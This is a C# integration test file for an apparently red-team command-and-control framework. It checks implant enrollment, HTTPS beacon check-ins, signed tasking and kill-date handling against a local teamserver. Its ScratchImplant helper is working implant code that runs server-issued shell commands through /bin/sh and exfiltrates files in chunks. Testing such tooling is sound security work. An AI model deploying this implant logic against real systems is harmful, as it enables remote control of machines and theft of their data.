using System.Net;
using System.Net.Http.Json;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.Audit;
using Rod.CoreState;
using Rod.CoreState.Implants;
using Rod.CoreState.Pki;
using Rod.CoreState.Sessions;
using Rod.Transport;
using Rod.V1;

namespace Rod.Integration.Tests;

/// <summary>
/// Acceptance for the plain-HTTP envelope check-in (architecture.md Sec 8,
/// the implant-reach escape hatch): the same rod.v1 frames the gRPC stream
/// carries, as varint-length-delimited sequences in ordinary HTTPS
/// request/response bodies over the same client certificates. The acceptance
/// bar is the todo's own criterion: a from-scratch implant written from the
/// contract doc alone, using no gRPC library, enrolls, checks in, and
/// completes a task. <see cref="ScratchImplant"/> is that implant -- an
/// HttpClient, the protobuf messages, a hand-rolled varint codec, and the
/// canonical tasking-signature verification, nothing else.
/// </summary>
public class EnvelopeCheckInTests
{
    [Fact]
    public async Task FromScratchImplant_EnrollsChecksInAndCompletesTask()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintStagerTokenAsync();

        // The from-scratch implant: RSA-2048 keypair, JSON enroll over plain
        // HTTP, envelope check-ins over mTLS with the issued leaf. No gRPC
        // library anywhere on this path.
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, env.MtlsBaseAddress, secret);
        Assert.False(string.IsNullOrEmpty(implant.ImplantId));

        // First check-in: the handshake alone. The response's first frame is
        // the handshake response, and the implant is online in its engagement.
        var first = await implant.CheckInAsync();
        var handshake = HandshakeResponse.Parser.ParseFrom(first[0].Payload);
        Assert.Equal(HandshakeStatus.Ok, handshake.Status);
        Assert.Equal(1, handshake.Version.Major);
        Assert.Equal(implant.EngagementId, handshake.EngagementId);
        Assert.Single(first); // nothing queued: the response carries no tasking.

        var sessions = env.Host.Services.GetRequiredService<ISessionRegistry>();
        Assert.True(EngagementId.TryParse(implant.EngagementId, out var engagementId));
        var online = await sessions.ListActiveAsync(engagementId);
        Assert.Single(online, s => s.ImplantId.ToString() == implant.ImplantId);

        // The operator tasks the implant while it sleeps its interval.
        var marker = "rod-envelope-marker-" + Guid.NewGuid().ToString("N")[..8];
        var (taskId, _) = await env.IssueTaskAsync(
            implant.EngagementId, implant.ImplantId, "shell.exec", $"echo {marker}");

        // The next check-in drains the task: a signed TaskRequest rides the
        // response after the handshake frame.
        var second = await implant.CheckInAsync();
        Assert.True(second.Count >= 2, "expected the handshake response plus a task");
        var request = TaskRequest.Parser.ParseFrom(second[1].Payload);
        Assert.Equal(taskId, request.TaskId);
        Assert.Equal("shell.exec", request.Verb);
        Assert.NotEmpty(request.Signature.ToByteArray());

        // Tier 1, as the contract doc specifies: verify the signature over the
        // canonical tuple with the enrolled CA before executing anything.
        Assert.True(implant.VerifyTasking(request), "the dispatched tasking failed signature verification");

        // Run the verb (shell.exec: one shot, stdout captured) and report the
        // result on the next check-in.
        var (output, exitCode) = RunShell(request.Arguments);
        var third = await implant.CheckInAsync(new[] { ImplantFrames.TaskResult(
            request.TaskId,
            exitCode == 0 ? Rod.V1.TaskOutcome.Succeeded : Rod.V1.TaskOutcome.Failed,
            output) });
        Assert.Single(third); // handshake response only: nothing else queued.

        var task = await env.GetTaskAsync(implant.EngagementId, taskId);
        Assert.Equal("Completed", task!.Status);
        Assert.Equal("Succeeded", task.Outcome);
        Assert.Contains(marker, task.Output);
        Assert.Equal(3, task.Audit.Length);
        Assert.Equal("TaskIssued", task.Audit[0].Kind);
        Assert.Equal("TaskDispatched", task.Audit[1].Kind);
        Assert.Equal("TaskCompleted", task.Audit[2].Kind);
    }

    [Fact]
    public async Task Envelope_ExfilChunksInRequestBody_MaterializeArtifact()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintStagerTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, env.MtlsBaseAddress, secret);
        await implant.CheckInAsync();

        // A file.pull task names a path on the target; the from-scratch
        // handler reads the bytes and streams them back as exfil chunks after
        // the TaskResult, all inside one request body -- the envelope's exfil
        // discipline: an artifact's chunk run begins and ends within one
        // check-in.
        var content = RandomNumberGenerator.GetBytes(2 * 1024 * 1024);
        var path = Path.Combine(Path.GetTempPath(), "rod-envelope-pull-" + Guid.NewGuid().ToString("N") + ".bin");
        await File.WriteAllBytesAsync(path, content);
        try
        {
            var (taskId, _) = await env.IssueTaskAsync(
                implant.EngagementId, implant.ImplantId, "file.pull", path);

            var checkIn = await implant.CheckInAsync();
            var request = TaskRequest.Parser.ParseFrom(checkIn[1].Payload);
            Assert.Equal("file.pull", request.Verb);

            var frames = new List<Frame>
            {
                ImplantFrames.TaskResult(request.TaskId, Rod.V1.TaskOutcome.Succeeded, path),
            };
            frames.AddRange(ImplantFrames.ExfilChunkRun(request.TaskId, Path.GetFileName(path), content));
            await implant.CheckInAsync(frames.ToArray());

            var artifacts = env.Host.Services.GetRequiredService<IArtifactStore>();
            var stored = (await artifacts.ForTaskAsync(Guid.Parse(taskId)))
                .Single(a => a.Name == Path.GetFileName(path));
            Assert.Equal(content, stored.Content);
        }
        finally
        {
            try { File.Delete(path); } catch { }
        }
    }

    [Fact]
    public async Task Envelope_StagedPull_IsAnsweredInSameResponse()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintStagerTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, env.MtlsBaseAddress, secret);
        await implant.CheckInAsync();

        // A file.push larger than the inline cap stages the bytes server-side;
        // the demand path is the typed arm (architecture.md Sec 10).
        var content = RandomNumberGenerator.GetBytes(2 * 1024 * 1024);
        var path = Path.Combine(Path.GetTempPath(), "rod-envelope-push-" + Guid.NewGuid().ToString("N") + ".bin");
        try
        {
            var (taskId, _) = await env.IssueTaskAsync(
                implant.EngagementId, implant.ImplantId, "file.push", path, content);

            var checkIn = await implant.CheckInAsync();
            var request = TaskRequest.Parser.ParseFrom(checkIn[1].Payload);
            Assert.Equal("file.push", request.Verb);
            Assert.Equal(content.Length, (int)request.StagedBytes);

            // Demand the staged payload; the same response carries the chunk
            // run to its terminal chunk.
            var pull = await implant.CheckInAsync(new[] { ImplantFrames.StagedPull(request.TaskId) });
            var chunks = pull.Skip(1).Select(f => StagedChunk.Parser.ParseFrom(f.Payload)).ToList();
            Assert.NotEmpty(chunks);
            Assert.True(chunks[^1].Terminal);
            Assert.DoesNotContain(chunks, c => c != chunks[^1] && c.Terminal);
            var reassembled = chunks.SelectMany(c => c.Data).ToArray();
            Assert.Equal(content.Length, reassembled.Length);
            Assert.Equal(content, reassembled);

            // The sha256 token inside the signed arguments is the integrity
            // authority: the reassembled bytes hash to it.
            var hash = Convert.ToHexString(SHA256.HashData(reassembled)).ToLowerInvariant();
            Assert.Contains($"sha256:{hash}", request.Arguments);

            // The from-scratch handler lands the file and reports the result.
            var target = request.Arguments.Split(' ')[0];
            await File.WriteAllBytesAsync(target, reassembled);
            await implant.CheckInAsync(new[] { ImplantFrames.TaskResult(
                request.TaskId, Rod.V1.TaskOutcome.Succeeded, target) });

            var task = await env.GetTaskAsync(implant.EngagementId, taskId);
            Assert.Equal("Completed", task!.Status);
            Assert.Equal("Succeeded", task.Outcome);
        }
        finally
        {
            try { File.Delete(path); } catch { }
        }
    }

    [Fact]
    public async Task Envelope_ChannelTask_StaysQueuedForStreamTransport()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintStagerTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, env.MtlsBaseAddress, secret);
        await implant.CheckInAsync();

        // A shell.interact task is a live channel: its input half needs a
        // stream (architecture.md Sec 10.3), so the envelope check-in -- like
        // the DNS poll -- never claims it. It parks queued for a stream
        // transport.
        var (taskId, _) = await env.IssueTaskAsync(
            implant.EngagementId, implant.ImplantId, "shell.interact", "");

        var checkIn = await implant.CheckInAsync();
        Assert.Single(checkIn); // handshake response only; the channel was not claimed.

        var task = await env.GetTaskAsync(implant.EngagementId, taskId);
        Assert.Equal("Queued", task!.Status);
    }

    [Fact]
    public async Task Envelope_ResponseBudget_SplitsTaskingAcrossCheckIns()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintStagerTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, env.MtlsBaseAddress, secret);
        await implant.CheckInAsync();

        // Nine tasks whose argument strings each marshal to ~0.5 MB of
        // TaskRequest together exceed the 4 MiB dispatch budget, so no single
        // response can carry them all; what does not fit is requeued for the
        // next check-in.
        var padding = new string('x', 500 * 1000);
        var ids = new List<string>();
        for (var i = 0; i < 9; i++)
        {
            var (taskId, _) = await env.IssueTaskAsync(
                implant.EngagementId, implant.ImplantId, "shell.exec", $"echo {i} {padding}");
            ids.Add(taskId);
        }

        var delivered = new List<string>();
        var responses = 0;
        while (delivered.Count < ids.Count && responses < 10)
        {
            var checkIn = await implant.CheckInAsync(delivered
                .Select(id => ImplantFrames.TaskResult(id, Rod.V1.TaskOutcome.Succeeded, "ok"))
                .ToArray());
            responses++;
            foreach (var frame in checkIn.Skip(1))
                delivered.Add(TaskRequest.Parser.ParseFrom(frame.Payload).TaskId);
        }

        // The budget did its job: the tasking needed more than one response,
        // and every task was delivered exactly once across the check-ins.
        Assert.True(responses >= 2, $"expected the budget to split the tasking, got {responses} response(s)");
        Assert.Equal(ids.OrderBy(x => x), delivered.OrderBy(x => x));
    }

    [Fact]
    public async Task Envelope_HandshakeRefusals_ReachWireStatus()
    {
        await using var env = await TestEnv.StartAsync();

        // A kill-date-expired implant, enrolled directly through the core
        // ports with a passed kill date -- the same fixture the stream-side
        // refusal test uses. The envelope handshake must answer the same
        // wire status, and the refusal closes the check-in after the
        // handshake response.
        var ca = env.Host.Services.GetRequiredService<IImplantCertificateAuthority>();
        var implants = env.Host.Services.GetRequiredService<IImplantRepository>();
        var clock = env.Host.Services.GetRequiredService<TimeProvider>();
        var now = clock.GetUtcNow();
        var expired = Rod.CoreState.Implants.Implant.Enroll(
            ImplantId.New(), EngagementId.New(),
            now.AddDays(-1), ImplantClass.Stage2, now.AddDays(-2));
        await implants.SaveAsync(expired);
        using var key = RSA.Create(2048);
        var issued = await ca.IssueWithKeyAsync(
            new ImplantCertificateSubject(expired.Id, expired.EngagementId), key, CancellationToken.None);

        using var expiredClient = ScratchImplant.ConnectBeacon(
            env.MtlsBaseAddress,
            X509CertificateLoader.LoadCertificate(issued.Leaf),
            new[] { ca.GetCaCertificate() }, key,
            expired.Id.ToString(), expired.EngagementId.ToString());
        var response = await expiredClient.CheckInAsync();
        var handshake = HandshakeResponse.Parser.ParseFrom(response[0].Payload);
        Assert.Equal(HandshakeStatus.KillDateExpired, handshake.Status);
        Assert.Single(response);

        // Version mismatch maps the same way it does on the stream.
        var secret = await env.MintStagerTokenAsync();
        using var fresh = await ScratchImplant.EnrollAsync(env.EnrollUrl, env.MtlsBaseAddress, secret);
        var mismatch = await fresh.CheckInAsync(major: 2);
        var mismatchHandshake = HandshakeResponse.Parser.ParseFrom(mismatch[0].Payload);
        Assert.Equal(HandshakeStatus.VersionMismatch, mismatchHandshake.Status);
        Assert.Single(mismatch);
    }

    [Fact]
    public async Task Envelope_RequiresClientCertificate()
    {
        // The route is mapped on every listener, but a check-in without the
        // mTLS-presented implant certificate is refused before any frame is
        // read -- over plain HTTP there is no certificate at all.
        await using var env = await TestEnv.StartAsync();
        var response = await env.Http.PostAsync(
            "/implants/beacon", new ByteArrayContent(new byte[] { 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f }));
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task Envelope_MalformedAndOversizedBodies_AreRefused()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintStagerTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, env.MtlsBaseAddress, secret);

        // A body whose first byte starts a varint that never terminates within
        // the uint32 budget is malformed framing, not a frame sequence.
        var malformed = await implant.PostRawAsync(new byte[] { 0x80, 0x80, 0x80, 0x80, 0x80, 0x01 });
        Assert.Equal(HttpStatusCode.BadRequest, malformed.StatusCode);

        // A declared frame length over the per-frame cap is refused as
        // oversized regardless of how few bytes follow it.
        var oversized = await implant.PostRawAsync(EncodeVarint(2 * 1024 * 1024 + 1));
        Assert.Equal(HttpStatusCode.RequestEntityTooLarge, oversized.StatusCode);
    }

    private static byte[] EncodeVarint(int value)
    {
        using var buffer = new MemoryStream();
        uint remaining = (uint)value;
        while (remaining >= 0x80)
        {
            buffer.WriteByte((byte)(remaining | 0x80));
            remaining >>= 7;
        }
        buffer.WriteByte((byte)remaining);
        return buffer.ToArray();
    }

    // Runs one shell.exec command and captures stdout, the reference verb's
    // own grammar. A non-zero exit reports Failed with the output kept.
    private static (string Output, int ExitCode) RunShell(string arguments)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName = "/bin/sh",
            Arguments = "-c \"" + arguments.Replace("\"", "\\\"") + "\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
        };
        using var process = System.Diagnostics.Process.Start(psi)!;
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit(15000);
        return (output, process.ExitCode);
    }

    /// <summary>
    /// The from-scratch Tier 0 implant the acceptance bar names: written from
    /// extending/implants.md alone, using no gRPC library. An HttpClient with
    /// the enrolled leaf for mTLS, the protobuf messages, a hand-rolled
    /// varint-length-delimited envelope codec, and the canonical
    /// tasking-signature verification -- the whole obligation, nothing more.
    /// </summary>
    private sealed class ScratchImplant : IDisposable
    {
        public string ImplantId { get; private set; } = string.Empty;
        public string EngagementId { get; private set; } = string.Empty;

        private readonly HttpClient _beacon;
        private readonly List<X509Certificate2> _cas = new();

        private ScratchImplant(HttpClient beacon)
        {
            _beacon = beacon;
        }

        /// <summary>
        /// The Tier 0 obligation, first half: generate the keypair, POST the
        /// public half with the stager token, keep the private half, and hold
        /// the issued leaf plus CA chain. The beacon base address is the mTLS
        /// endpoint, distinct from the plain enroll listener.
        /// </summary>
        public static async Task<ScratchImplant> EnrollAsync(
            string enrollUrl, string beaconBaseAddress, string stagerToken)
        {
            using var key = RSA.Create(2048);
            using var plain = new HttpClient();
            var body = new
            {
                stagerTokenSecret = stagerToken,
                publicKey = Convert.ToBase64String(key.ExportSubjectPublicKeyInfo()),
            };
            using var response = await plain.PostAsJsonAsync(enrollUrl, body);
            response.EnsureSuccessStatusCode();
            await using var stream = await response.Content.ReadAsStreamAsync();
            using var document = await System.Text.Json.JsonDocument.ParseAsync(stream);
            var root = document.RootElement;

            var leaf = X509CertificateLoader.LoadCertificate(
                Convert.FromBase64String(root.GetProperty("leafCertificate").GetString()!));
            var cas = root.GetProperty("caChain").EnumerateArray()
                .Select(b64 => X509CertificateLoader.LoadCertificate(Convert.FromBase64String(b64.GetString()!)))
                .ToArray();

            var implant = ConnectBeacon(
                beaconBaseAddress,
                leaf, cas, key,
                root.GetProperty("implantId").GetString()!,
                root.GetProperty("engagementId").GetString()!);
            return implant;
        }

        /// <summary>
        /// The Tier 0 obligation, second half: a beacon client that presents
        /// the leaf over mTLS and pins chain-to-CA for the server identity.
        /// </summary>
        public static ScratchImplant ConnectBeacon(
            string baseAddress,
            X509Certificate2 leaf,
            IReadOnlyList<X509Certificate2> cas,
            RSA key,
            string implantId,
            string engagementId)
        {
            var leafWithKey = leaf.HasPrivateKey ? leaf : leaf.CopyWithPrivateKey(key);
            var handler = new SocketsHttpHandler
            {
                SslOptions = new SslClientAuthenticationOptions
                {
                    ClientCertificates = new X509CertificateCollection { leafWithKey },
                    RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                        PinServerChain(cert, chain, cas),
                },
            };
            var implant = new ScratchImplant(
                new HttpClient(handler) { BaseAddress = new Uri(baseAddress) })
            {
                ImplantId = implantId,
                EngagementId = engagementId,
            };
            implant._cas.AddRange(cas);
            return implant;
        }

        /// <summary>One poll check-in: POST the frames, parse the response.</summary>
        public async Task<List<Frame>> CheckInAsync(
            IEnumerable<Frame>? upstream = null, int major = 1, int minor = 0)
        {
            var frames = new List<Frame> { HandshakeFrame(major, minor) };
            if (upstream is not null)
                frames.AddRange(upstream);
            using var content = new ByteArrayContent(Encode(frames));
            content.Headers.ContentType =
                new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            using var response = await _beacon.PostAsync("/implants/beacon", content);
            response.EnsureSuccessStatusCode();
            return Parse(await response.Content.ReadAsByteArrayAsync());
        }

        /// <summary>Posts raw bytes, for the framing-refusal assertions.</summary>
        public async Task<HttpResponseMessage> PostRawAsync(byte[] body)
        {
            using var content = new ByteArrayContent(body);
            content.Headers.ContentType =
                new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            return await _beacon.PostAsync("/implants/beacon", content);
        }

        /// <summary>
        /// Tier 1 tasking verification, exactly as the contract doc specifies:
        /// RSASSA-PSS over SHA-256 on the canonical length-prefixed
        /// (implant_id, task_id, verb, arguments) tuple, verified with the
        /// enrolled CA. The implant id in the tuple is the verifier's own.
        /// </summary>
        public bool VerifyTasking(TaskRequest request)
        {
            using var canonical = new MemoryStream();
            foreach (var value in new[] { ImplantId, request.TaskId, request.Verb, request.Arguments })
            {
                var bytes = System.Text.Encoding.UTF8.GetBytes(value);
                canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
                canonical.Write(bytes, 0, bytes.Length);
            }
            var signed = canonical.ToArray();

            foreach (var ca in _cas)
            {
                using var rsa = ca.GetRSAPublicKey();
                if (rsa is null)
                    continue;
                if (rsa.VerifyData(signed, request.Signature.ToByteArray(),
                        HashAlgorithmName.SHA256, RSASignaturePadding.Pss))
                    return true;
            }
            return false;
        }

        public void Dispose() => _beacon.Dispose();

        private Frame HandshakeFrame(int major, int minor)
            => new()
            {
                Payload = ByteString.CopyFrom(new HandshakeRequest
                {
                    Version = new ProtocolVersion { Major = major, Minor = minor },
                    ImplantId = ImplantId,
                    Capabilities = { "shell.exec", "file.pull", "file.push" },
                }.ToByteArray()),
            };

        // The envelope codec: the protobuf canonical delimited-stream shape --
        // an unsigned varint length before each marshaled Frame.

        private static byte[] Encode(IReadOnlyList<Frame> frames)
        {
            var body = new MemoryStream();
            foreach (var frame in frames)
            {
                var marshaled = frame.ToByteArray();
                WriteVarint(body, marshaled.Length);
                body.Write(marshaled);
            }
            return body.ToArray();
        }

        private static List<Frame> Parse(byte[] body)
        {
            var frames = new List<Frame>();
            var position = 0;
            while (position < body.Length)
            {
                uint length = 0;
                var shift = 0;
                int delimiter;
                for (delimiter = 0; delimiter < 5; delimiter++)
                {
                    var b = body[position + delimiter];
                    length |= (uint)(b & 0x7f) << shift;
                    if ((b & 0x80) == 0)
                        break;
                    shift += 7;
                }
                position += delimiter + 1;
                frames.Add(Frame.Parser.ParseFrom(body, position, (int)length));
                position += (int)length;
            }
            return frames;
        }

        private static void WriteVarint(MemoryStream target, int value)
        {
            uint remaining = (uint)value;
            while (remaining >= 0x80)
            {
                target.WriteByte((byte)(remaining | 0x80));
                remaining >>= 7;
            }
            target.WriteByte((byte)remaining);
        }

        // Accepts the peer certificate iff it chains to one of the pinned CAs
        // (the contract's TLS shape: the teamserver presents the engagement CA
        // itself, carrying no SANs, so the pin is chain-to-CA, not a name).
        private static bool PinServerChain(
            X509Certificate? certificate,
            X509Chain? chain,
            IReadOnlyList<X509Certificate2> pinned)
        {
            if (certificate is not X509Certificate2 || chain is null)
                return false;
            chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
            chain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
            foreach (var ca in pinned)
                chain.ChainPolicy.ExtraStore.Add(ca);
            if (!chain.Build((X509Certificate2)certificate) || chain.ChainElements.Count == 0)
                return false;
            var root = chain.ChainElements[^1].Certificate;
            foreach (var ca in pinned)
                if (root.Thumbprint == ca.Thumbprint)
                    return true;
            return false;
        }
    }

    // The upstream frame builders the from-scratch implant sends after its
    // handshake: a task result, an exfil chunk run, a staged pull.
    private static class ImplantFrames
    {
        public static Frame TaskResult(string taskId, Rod.V1.TaskOutcome outcome, string output)
            => new()
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult
                {
                    TaskId = taskId,
                    Outcome = outcome,
                    Output = output,
                }.ToByteArray()),
            };

        public static IEnumerable<Frame> ExfilChunkRun(string taskId, string name, byte[] content)
        {
            const int chunkSize = 512 * 1024;
            for (var offset = 0; ; offset += chunkSize)
            {
                var end = Math.Min(offset + chunkSize, content.Length);
                var slice = new byte[end - offset];
                Array.Copy(content, offset, slice, 0, slice.Length);
                var terminal = end == content.Length;
                yield return new Frame
                {
                    Kind = FrameKind.ExfilChunk,
                    Payload = ByteString.CopyFrom(new ExfilChunk
                    {
                        TaskId = taskId,
                        Name = name,
                        ContentType = "application/octet-stream",
                        Sequence = (ulong)(offset / chunkSize),
                        Terminal = terminal,
                        Data = ByteString.CopyFrom(slice),
                    }.ToByteArray()),
                };
                if (terminal)
                    yield break;
            }
        }

        public static Frame StagedPull(string taskId)
            => new()
            {
                Kind = FrameKind.StagedPull,
                Payload = ByteString.CopyFrom(new StagedPull { TaskId = taskId }.ToByteArray()),
            };
    }

    /// <summary>
    /// A real Kestrel teamserver: the mTLS implant endpoint (gRPC beacon and
    /// the envelope route both live here) plus the plain-HTTP operator and
    /// enroll API, with a logged-in operator client.
    /// </summary>
    private sealed class TestEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;
        public int HttpPort { get; private set; }
        public int MtlsPort { get; private set; }
        public string EnrollUrl => $"http://127.0.0.1:{HttpPort}/implants/enroll";
        public string MtlsBaseAddress => $"https://127.0.0.1:{MtlsPort}";

        private string? _engagementId;

        public static async Task<TestEnv> StartAsync()
        {
            var env = new TestEnv();
            env.HttpPort = GetFreeTcpPort();
            env.MtlsPort = GetFreeTcpPort();

            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder
                    .UseRodMtls(env.MtlsPort)
                    .ConfigureKestrel(kestrel => kestrel.ListenLocalhost(env.HttpPort)))
                .Build();
            await env.Host.StartAsync();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://127.0.0.1:{env.HttpPort}"),
            };
            await AuthenticatedHost.LoginAsync(env.Http);
            return env;
        }

        /// <summary>
        /// Creates a fresh engagement and mints a stager token against it,
        /// caching the engagement id the token resolves to.
        /// </summary>
        public async Task<string> MintStagerTokenAsync()
        {
            var engagement = await Http.PostAsJsonAsync("/engagements",
                new { name = "envelope-" + Guid.NewGuid().ToString("N")[..8] });
            engagement.EnsureSuccessStatusCode();
            var created = await engagement.Content.ReadFromJsonAsync<EngagementBody>();
            Assert.NotNull(created);
            _engagementId = created!.EngagementId;

            var minted = await Http.PostAsJsonAsync($"/engagements/{_engagementId}/stager-tokens", new { });
            minted.EnsureSuccessStatusCode();
            var token = await minted.Content.ReadFromJsonAsync<StagerTokenBody>();
            Assert.NotNull(token);
            return token!.Secret;
        }

        public async Task<(string TaskId, string Verb)> IssueTaskAsync(
            string engagementId, string implantId, string verb, string arguments, byte[]? content = null)
        {
            var issued = await Http.PostAsJsonAsync(
                $"/engagements/{engagementId}/tasks",
                new { ImplantId = implantId, Verb = verb, Arguments = arguments, Content = content });
            issued.EnsureSuccessStatusCode();
            var body = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();
            Assert.NotNull(body);
            return (body!.TaskId, body.Verb);
        }

        public async Task<TaskBody?> GetTaskAsync(string engagementId, string taskId)
            => await Http.GetFromJsonAsync<TaskBody>(
                $"/engagements/{engagementId}/tasks/{taskId}");

        public async ValueTask DisposeAsync()
        {
            Http?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }

        private static int GetFreeTcpPort()
        {
            using var listener = new System.Net.Sockets.TcpListener(IPAddress.Loopback, 0);
            listener.Start();
            var port = ((IPEndPoint)listener.LocalEndpoint).Port;
            listener.Stop();
            return port;
        }
    }

    // Minimal DTOs for the operator JSON round-trips; the transport owns the
    // wire shape.

    private sealed class EngagementBody
    {
        public string EngagementId { get; set; } = "";
    }

    private sealed class StagerTokenBody
    {
        public string Secret { get; set; } = "";
    }

    private sealed class TaskIssuedBody
    {
        public string TaskId { get; set; } = "";
        public string Verb { get; set; } = "";
    }

    private sealed class TaskBody
    {
        public string Status { get; set; } = "";
        public string? Output { get; set; }
        public string? Outcome { get; set; }
        public AuditBody[] Audit { get; set; } = Array.Empty<AuditBody>();
    }

    private sealed class AuditBody
    {
        public string Kind { get; set; } = "";
    }
}
